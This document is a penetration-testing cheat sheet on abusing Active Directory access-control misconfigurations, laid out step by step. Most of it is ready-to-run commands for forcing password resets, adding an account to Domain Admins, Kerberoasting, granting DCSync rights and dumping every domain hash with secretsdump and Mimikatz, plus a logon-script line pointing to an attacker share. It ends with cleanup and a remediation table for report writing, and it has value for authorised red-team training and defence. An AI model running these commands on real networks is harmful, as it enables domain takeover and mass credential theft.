# ACL Abuse

## What Are ACLs in AD?

Every object in Active Directory (users, groups, computers, OUs) has an **Access Control List** - a list of who can do what to it. BloodHound maps these visually. When a user has overpermissive rights on an object, you can abuse those rights to escalate.

**This is one of the most common paths BloodHound shows you.** The path often looks like:
```
your user -> has GenericAll -> some service account -> that account has DCSync rights
```

---

## Finding ACL Misconfigurations

```sh
# BloodHound - after importing data, run:
# "Find Shortest Paths to Domain Admins"
# Right-click any edge -> Help -> shows the exact attack

# PowerView - enumerate ACLs for your user
Get-DomainObjectAcl -Identity "targetuser" -ResolveGUIDs
Get-DomainObjectAcl -SamAccountName "targetuser" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDacl"}

# Find all objects your user has rights over
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match "youruser"}
```

---

## GenericAll (Full Control)

You have complete control over the object. Most powerful right.

### On a User - Force Password Reset
```powershell
# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Native AD
net user targetuser NewPass123! /domain
```

### On a Group - Add Yourself
```powershell
# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members youruser

# Net command
net group "Domain Admins" youruser /add /domain
```

### On a Computer - Resource-Based Constrained Delegation
See [Delegation Attacks](delegation-attacks.md).

---

## GenericWrite

Can modify certain attributes of the object.

### On a User - Set SPN for Kerberoasting
```powershell
# Set an SPN on a user that has no SPN (makes them Kerberoastable)
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/NOTHING'}

# Now Kerberoast them
GetUserSPNs.py corp.local/youruser:pass -dc-ip <DC-IP> -request

# Clean up after
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

### On a User - Set logon script (for code execution)
```powershell
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.ps1'}
```

---

## WriteDACL

Can modify the ACL of the object - meaning you can grant yourself any permission you want, including GenericAll.

```powershell
# Add GenericAll to yourself on a target object
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All

# Now you have GenericAll -> use force password reset above
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

### WriteDACL on Domain Object -> DCSync Rights
If you have WriteDACL on the **domain object itself**:
```powershell
# Add DCSync rights to your account
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity youruser -Rights DCSync

# Now dump all hashes
lsadump::dcsync /domain:corp.local /all /csv
secretsdump.py corp.local/youruser:pass@<DC-IP>
```

---

## WriteOwner

Can change who owns the object. Owner has implicit rights to modify the DACL.

```powershell
# Take ownership of the object
Set-DomainObjectOwner -Identity targetobject -OwnerIdentity youruser

# Now grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity youruser -Rights All
```

---

## ForceChangePassword

Can reset the user's password without knowing the current one.

```powershell
# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# rpcclient (from Linux)
rpcclient -U "domain/youruser%pass" <DC-IP>
> setuserinfo2 targetuser 23 'NewPass123!'
```

---

## AllExtendedRights

Includes ForceChangePassword plus other extended rights like reading LAPS passwords.

```powershell
# Read LAPS password (if LAPS deployed)
Get-DomainComputer -Identity targetpc -Properties ms-mcs-admpwd
```

---

## DCSync Rights (Without Being DA)

Some accounts are granted DCSync rights directly (replication rights on the domain object). BloodHound shows this as the `DCSync` edge.

```sh
# If your account has DCSync rights:
secretsdump.py corp.local/youruser:pass@<DC-IP>

# Or in Mimikatz:
lsadump::dcsync /domain:corp.local /user:Administrator
```

---

## Full Attack Flow Example

BloodHound shows: `jdoe -> GenericAll -> sqlservice -> DCSync -> Domain`

```
Step 1: Reset sqlservice password
  Set-DomainUserPassword -Identity sqlservice -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force)

Step 2: Authenticate as sqlservice
  evil-winrm -i <DC-IP> -u sqlservice -p 'Hacked123!'

Step 3: DCSync from sqlservice
  secretsdump.py corp.local/sqlservice:'Hacked123!'@<DC-IP>
  -> dumps all hashes -> you have DA
```

---

## Cleanup

ACL abuse leaves traces. After the engagement:
```powershell
# Remove added group members
Remove-DomainGroupMember -Identity "Domain Admins" -Members youruser

# Remove added ACL entries
Remove-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity youruser -Rights All

# Clear SPN you set
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

---

## Remediation (For Report Writing)

**Root cause:** ACL misconfigurations in AD are almost always the result of manual permission grants made by admins who needed quick access, combined with no process to review or remove them afterward.

| Finding | Remediation |
|---|---|
| GenericAll / GenericWrite on user or group | Remove the overpermissive ACE using **Active Directory Users and Computers -> Object -> Security** or PowerView `Remove-DomainObjectAcl`. Audit who legitimately needs write access. |
| WriteDACL on domain object (DCSync path) | Remove the ACE immediately - only Domain Admins and specific replication accounts should have replication rights on the domain object. |
| ForceChangePassword on privileged account | Remove the ACE. Implement a formal process for password resets that does not require delegated rights. |
| WriteOwner anywhere sensitive | Remove the ACE. Audit object ownership across the domain - objects owned by non-admin users are a red flag. |
| BloodHound shows paths to DA through ACLs | Run BloodHound **proactively** as a blue team tool (quarterly or after any major AD change). Use **PlumHound** to generate HTML reports of all paths to DA. |

**Key point for reports:** These permissions are invisible without dedicated tooling - no admin sees them in day-to-day operations. The fix is both technical (remove the ACE) and process (regular BloodHound audits so new misconfigurations are caught before attackers find them).
